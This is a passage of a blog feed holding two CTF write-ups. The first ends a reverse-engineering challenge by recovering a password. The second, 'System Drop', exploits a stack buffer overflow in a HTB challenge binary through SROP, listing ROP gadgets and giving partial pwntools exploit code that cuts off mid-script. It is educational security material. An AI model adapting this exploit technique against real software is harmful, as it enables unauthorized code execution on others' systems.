            &lt;span class=&quot;nf&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;part_x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
                &lt;span class=&quot;nf&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;part_x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;possibles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;



&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[1] Possibles&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;possibles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[2] Possibles&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;possibles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[3] Possibles&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;possibles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The result is:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/rusty-possibles.png&quot; alt=&quot;target&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The fact that the 2nd one only returns one makes the job easier. The first valid vector is the one whose last value is the same as the second value from the 2nd vector. That is the 3rd vector.&lt;/p&gt;

&lt;p&gt;Finally, the last one works the same. The valid one is the first from the 3rd vector list. And as we can see the fifth element (78) matches the second element from the 1st vector.&lt;/p&gt;

&lt;p&gt;So the result is: [49, 78, 53, 51, 67, 85, 114, 51, 55, 51, 88, 55]&lt;/p&gt;

&lt;p&gt;If we get the string version: 1N53CUr373X7&lt;/p&gt;

&lt;p&gt;Let’s run the program again with this password:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/rusty-flag.png&quot; alt=&quot;target&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We got it!&lt;/p&gt;</content><author><name>David Fernandez</name></author><category term="Userspace" /><category term="Exploitation" /><summary type="html">.., .??; ????. .??&apos; .??&apos; .???????????????????, .??; ?????????????.; .?????????????. ????.?????????????? .??????????????.???. ????????????., .?&apos; ,?.; ;&apos;.???????????. .??..????????., .????. .?????????.???, ,?????????.; &apos;?????????? .???????&apos; .???????, ,??????????. .?????????? .??????????................................., ;???????? .???????????????????????????????????????????????&apos; .??????, .?????????????????????????????????????????????????????&apos; ??????????&apos; .?????????????????????????????????????????????????????. .?????????&apos; ;???&apos; ;??&apos; .????????????, ;.????????????? &apos;?&apos; ,???. &apos;.???? .?. ;???????????. ,???????????? ;?? .????., .??????.; .?.; ;???????????. &apos;??????????? .?. .???????; .??????., ;????????????.&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;.???????????&apos; ,.???????&apos; .?????. ;??????????????????????????????????; ??????. &apos;????????&apos; ;??????????????????????????????????, ????????.; ;.??????&apos; ;?????????????........??????????????? ;???????. .?????. ;???????????? .???????????? ,?????????, &apos;??????? ;???????????. .???????????. .??????????; .????????. .???????????? ????????????. .????????????. .??????????????????????????????????? .???????????????????????????, ,??????????????????????????????????? ??????????????????????????. .???????????????????????????????????? ,???????????????????????????; ,&apos;.????????????????????????????????. .?????????????????????..,; &apos;????????; &apos;???????? ?????????. ;,&apos; ;,; &apos;?????????. ....????????.,;.?? .?.,,.????????..... ,??????. ?. ;?&apos; ,??????? .??????. &apos;??; .?. .???????; ;, .???..?????.&apos;; ,.?????..????, ;, ?????????????????..........?????????????????. ?.&apos; &apos;?????????????????????????????????; ;.?. .???..????????????????????...???&apos; ;.; ????, .?????&apos; &apos;???. ,. ;.; &apos;??? &apos;. ;&apos;</summary></entry><entry><title type="html">System Drop</title><link href="http://0.0.0.0:4000/2021/04/25/system-drop.html" rel="alternate" type="text/html" title="System Drop" /><published>2021-04-25T00:00:00+02:00</published><updated>2021-04-25T00:00:00+02:00</updated><id>http://0.0.0.0:4000/2021/04/25/system-drop</id><content type="html" xml:base="http://0.0.0.0:4000/2021/04/25/system-drop.html">&lt;pre style=&quot;font-size: 0.5vw; text-align: center&quot;&gt;
                                                      *****************************************     
                                                    *********************************************   
                                                    **********************************************  
                                                    *****                                  *******  
                                                    ****                                    ******  
                                                    ****                                    ******  
                                                    ******                                ********  
                                                    **********************************************  
                                                    ****                                    ******  
                               *******              ***                                      *****  
                              *********             ****                                    ******  
                            ************            **********************************************  
                           **************           **********************************************  
                          ****************          ****                                    ******  
                         ***            ****        ***                                      *****  
                        ****             ****        ****                                  *******  
                       *****             *****        ********************************************  
                     *******            *******         ******************************************  
                    ********            ********         *****************************************  
                   *********            *********         ****************************************  
                  **********            ***********        ***********************     ***********  
                 ************           *************       *********************       **********  
                *************           **************       ********************       **********  
               **************           ***************       *********************    ***********  
             ****************           ****************        **********************************  
            *****************           *****************        *********************************  
           ******************          *******************        ********************************  
          *******************          *********************       *******************************  
         *********************        ***********************       ******************************  
        **********************         ***********************       *****************************  
      **********************            ***********************        ***************************  
     **********************              ***********************        **************************  
    ***********************              ************************        *************************  
   *************************             *************************       *************************  
  **************************            ***************************       ************************  
   ***************************        *****************************      *************************  
      **********************************************************         *************************  
                                                                        **************************  
                                                                       ***************************  
                                                                    *****************************           
&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;This was a pwn challenge rated with 325 points at Cyber Apocalypse 2021 CTF from HTB.
I didn’t save the description of the chall but it said something about aliens.&lt;/p&gt;

&lt;p&gt;They only provide a binary.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;first-look&quot;&gt;First look&lt;/h2&gt;

&lt;p&gt;The first thing we notice when we open it is how small it is. Only a main function that calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alarm&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt;. There is an obvious buffer overflow because we read 0x100 bytes and the stack only expects 0x20 bytes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/main-drop.png&quot; alt=&quot;main&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s check the security of the binary:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/security-drop.png&quot; alt=&quot;Security&quot; /&gt;&lt;/p&gt;

&lt;p&gt;No canary (we already saw that in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function), no PIC and NX bit.&lt;/p&gt;

&lt;p&gt;So we have a very very small program (that means less ROP possibilities), that allows us to store a big amount of data into the stack and that’s it.&lt;/p&gt;

&lt;p&gt;The name of the challenge give us a clue but the real clue comes in the fact that a function called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sym._syscall&lt;/code&gt; is loaded. The contents are:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;push rbp
mov rbp, rsp
syscall
ret
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is clearly an SROP. We can store more than 248 bytes (which is the size of the frame) and we have a syscall available. Let’s do this.&lt;/p&gt;

&lt;h2 id=&quot;f&quot;&gt;F&lt;/h2&gt;

&lt;p&gt;To trigger the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sigreturn&lt;/code&gt; syscall we only need to set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt; register to 15 or 0xf and then call the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; function with the frame in the stack.&lt;/p&gt;

&lt;p&gt;Then, we can set all the registers to make the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.text&lt;/code&gt; section writable by calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memprotect&lt;/code&gt; syscall, redirect to main and write on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.text&lt;/code&gt; section whatever shellcode we want.&lt;/p&gt;

&lt;p&gt;Let’s search for a ROP gadget that allow us to set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt; register…none.&lt;/p&gt;

&lt;h2 id=&quot;the-long-road&quot;&gt;The long road&lt;/h2&gt;

&lt;p&gt;How else could we set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt; register? Well, it is used for something else.&lt;/p&gt;

&lt;p&gt;It is used as the return value from functions. And the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt; function returns the amount of bytes read. So if we could read only 15 bytes, we could set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt; register.&lt;/p&gt;

&lt;p&gt;But the ROP chain is going to be longer, obviously. Only the frame is 248 bytes.&lt;/p&gt;

&lt;p&gt;And we have another problem, the frame is going to use 248 bytes and we can read 0x100 bytes or, in base 10, 256 bytes. We can only use 8 more bytes for the ROP. We definetly need more than 8 bytes.&lt;/p&gt;

&lt;p&gt;On the first read we have to store the ROP chain but if we trigger a second read we have to say where to store the data so we should move the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; pointer to somewhere we know.&lt;/p&gt;

&lt;p&gt;Let’s make a list:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Store the ROP chain&lt;/li&gt;
  &lt;li&gt;Move the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; to a static address.&lt;/li&gt;
  &lt;li&gt;Store the frame&lt;/li&gt;
  &lt;li&gt;Read 15 bytes to set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt; register.&lt;/li&gt;
  &lt;li&gt;Call the syscall.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Well, we have a gadget we could use to move the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; (I am using &lt;a href=&quot;https://github.com/JonathanSalwan/ROPgadget&quot;&gt;RopGadget&lt;/a&gt; to get the gadgets) and also another for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; to set the parameters to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt; function:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;0x00000000004005cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004005d3 : pop rdi ; ret
0x00000000004005d1 : pop rsi ; pop r15 ; ret
0x0000000000400416 : ret
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We could use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.data&lt;/code&gt; section to redirect the new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; there.&lt;/p&gt;

&lt;h2 id=&quot;building-the-script&quot;&gt;Building the script&lt;/h2&gt;

&lt;p&gt;First, import &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; and store all the addresses we need and the offset to the buffer overflow (0x20 + 8 for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp&lt;/code&gt;):&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;amd64&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00601028&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;read_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00400440&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000004005d3&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pop_rsi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000004005d1&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pop_rsp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000004005cd&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;syscall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0040053b&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00400541&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the first read we are going to store the next part of the ROP in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.data&lt;/code&gt; section:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Notice: the read function reads as much data as stated in the argument or if the buffer holds less than that, as much as it is. This means that we have to fill the buffer with the amount of data read (0x100) so we avoid the function reading more than we want.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;first_read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;redirect_rsp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redirect_rsp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redirect_rsp&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Perfect, now we send the second part of the ROP: another read for the frame, another one for the 0xf in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt; and finally the call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;I added a bunch of ret just in case it was an ubuntu 18.04 with the movaps issue&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;second_read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;900&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span 